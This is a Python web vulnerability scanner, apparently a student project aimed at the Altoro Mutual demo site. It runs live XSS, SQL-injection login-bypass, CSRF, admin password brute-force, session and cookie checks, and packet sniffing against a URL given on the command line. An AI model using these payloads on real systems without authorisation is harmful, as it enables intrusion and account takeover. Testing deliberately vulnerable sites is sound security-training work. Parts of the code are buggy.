import requests
from bs4 import BeautifulSoup as bs
import sys
import os
from requests.sessions import session
import json
import base64
from scapy import data
from scapy.all import *
from scapy.layers.http import HTTPRequest
result_list = {}

def getForm(url):
    s = requests.session()
    soup=bs(s.get(url,verify = False).text, "html.parser")
    obj_form=soup.find_all("form")

    while(not obj_form):
        for x in soup.find_all("a"):
            href = x.attrs.get("href")
            soup=bs(requests.get(url+href).text, "html.parser")
            obj_form=soup.find_all("form")
        
    for x in obj_form:
        action = x.attrs.get("action")
        method = x.attrs.get("method")

    obj_input=soup.find_all("input")
    obj_textarea=soup.find_all("textarea")

    inputs = {}
    i = 0
    for x in obj_input:
        
        input_type = x.attrs.get("type")
        input_name = x.attrs.get("name")
        input_value = x.attrs.get("value")
        inputs["type{}".format(i)] = input_type
        inputs["name{}".format(i)] = input_name
        inputs["value{}".format(i)] = input_value
        i = i+1
    z = 0
    for x in obj_textarea:
        textarea_name = x.attrs.get("name")
        inputs["textarea_name{}".format(z)] = textarea_name
        z = z+1


    #딕셔너리 생성 : action, method, input
    form_info ={}
    form_info["action"] = action
    form_info["method"] = method

    target_url = url+form_info["action"]

    return target_url, form_info["method"]

def XSS(url):
    target_url, method = getForm(url)
    
    insert_data = { "query" : "<script>alert('hi')</script>"}
    if method == "post":
        res=requests.post(target_url, data=insert_data).text
    else :
        res=requests.get(target_url, params=insert_data).text

    
    if  "<script>alert('hi')</script>" in res:
        result_list['XSS']='위험'
        result_list['XSS_info']=target_url
    else : 
        result_list['XSS']='안전'
        result_list['XSS_info']=target_url
        

def CSRF(url):
    target_url =url+"/doLogin"
    session = requests.session()
    login_info ={
        "uid":"' or 1=1--+",
        "passw":"1234",
        "btnSubmit":"Login"
    }
    res=session.post(target_url, data=login_info)
    target_url = url+"/sendFeedback"
    
    send_info ={
        "cfile":"comments.txt",
        "name": "<body onload='csrf.submit();'><form name='csrf'action='http://altoromutual.com:8080/logout.jsp'</form>",
        "email_addr":"1@gmail.com",
        "subject":"2",
        "comments": "3",
        "submit":"Submit"
    }
    res=session.post(target_url, data=send_info)
    session = requests.session()
    res=requests.get(url)

    if "Sign In" in res.text:
       result_list['CSRF']='위험'
       result_list['CSRF_info']=target_url
    else:
        result_list['CSRF']='안전'
        result_list['CSRF_info']=target_url
        
 
 
def sqlInjection(url):
    target_url =url+"/doLogin"

    login_info ={
        "uid":"' or 1=1--+",
        "passw":"1234",
        "btnSubmit":"Login"
    }
    content=requests.post(target_url, data=login_info).text
    
    if "Welcome" in content:
        result_list['sqlin']='위험'
        result_list['sql_info']=target_url
        
    else:
        result_list['sqlin']='안전'
        result_list['sql_info']=target_url
        

def bruteForce(url):
    target_url =url+"/doLogin"
    session = requests.session()
    
    password_list = open(os.getcwd()+"\password.txt", "r")
    password = password_list.readlines()

    for psword in password:
        passwordd = psword.strip()

        login_info ={
            "uid":"admin",
            "passw": passwordd,
            "btnSubmit":"Login"
        }

        content=session.post(target_url, data=login_info).text
        
        if "Welcome" in content:
            result_list['bruteForce']='위험'
            result_list['bruteForce_info']=target_url
            return
    result_list['bruteForce']='안전'
    result_list['bruteForce_info']=target_url
           
def cookie(url):
    target_url =url+"/doLogin"
    session = requests.session()
    
    login_info ={
    "uid":"' or 1=1--+",
    "passw":"1234",
    "btnSubmit":"Login"
    }
    session.post(target_url, data=login_info)
    cookiejar = session.cookies

    for cookie in cookiejar:
        if cookie.secure == False :
            result_cookie_secure= False
        else : 
            result_cookie_secure= True
        
        if cookie.expires == None :
            result_cookie_expires= False
        else : 
            result_cookie_expires= True

    if result_cookie_secure and result_cookie_expires :
        result_list["cookie"]='안전'
        result_list['cookie_info']='secure,expire 설정됨'
        
    else:
        result_list["cookie"]='위험'
        result_list['cookie_info']='secure,expire 설정필요' 
        

def session_fix(url):
    target_url =url+"/doLogin"
    login_info ={
        "uid":"admin",
        "passw":"admin",
        "btnSubmit":"Login"
    }
    with requests.Session() as s:
        res = s.get(target_url, data= login_info)
        cookie1 = res.headers['Set-Cookie']
    with requests.Session() as s:    
        res = s.get(target_url, data= login_info)
        cookie2 = res.headers['Set-Cookie']
    if cookie1 == cookie2 :
        result_list["http"]="위험"
    else : 
        result_list["http"]="안전"          

        

def base64Vul(url):
    target_url =url+"/doLogin"
    session = requests.session()

    login_info ={
    "uid":"' or 1=1--+",
    "passw":"1234",
    "btnSubmit":"Login"
    }
    session.post(target_url, data=login_info)
    cookiejar = session.cookies

    cookieValue = []
    for cookie in cookiejar:
        cookieValue.append(cookie.value)
    
    result_list['base64Vul'] = ''    
    for i in range(len(cookieValue)):
        data_bin=base64.b64decode(cookieValue[i])
        if isinstance(data_bin, str ):
            result_list['base64Vul'] = result_list['base64Vul'] + data_bin
        else : 
            result_list['base64Vul'] = result_list['base64Vul'] + str(data_bin)
        
def redirect_vul(url):
    target_url =url+"/doLogin"
    login_info ={
        "uid":"admin",
        "passw":"admin",
        "btnSubmit":"Login"
    }

    r = requests.get(target_url)
    try:
        session2 = r.headers['Strict-Transport-Security']
    except KeyError as session2:
        result_list['sessionVul'] = '위험'
    else:
        result_list['sessionVul'] = '안전'

def sniffing():
     sniff(lfilter=showPacket, timeout=10)

temp=0
def showPacket(packet):
    scapy.all.load_layer("http")
    target_url =url+"/doLogin"
    login_info ={
        "uid":"admin",
        "passw":"admin",
        "btnSubmit":"Login"
    }
    requests.post(target_url, data=login_info)
    pk = raw(packet)
    strpk = str(pk)
    global temp
    if 'uid=admin' in strpk:
     result_list['sniff'] = '위험'
     temp=1
    elif temp==1:
        result_list['sniff'] = '위험'
        result_list["http_info"]="HTTPS 프로토콜 필요"
    else:
        result_list['sniff'] = '안전'
        result_list["http_info"]="HTTPS 프로토콜 사용 중"

url = str(sys.argv[1])

XSS(url)
sqlInjection(url)
CSRF(url)
bruteForce(url)
cookie(url)
session_fix(url)
base64Vul(url)
redirect_vul(url)
sniffing()
json_result=json.dumps(result_list)
print(json_result)

        
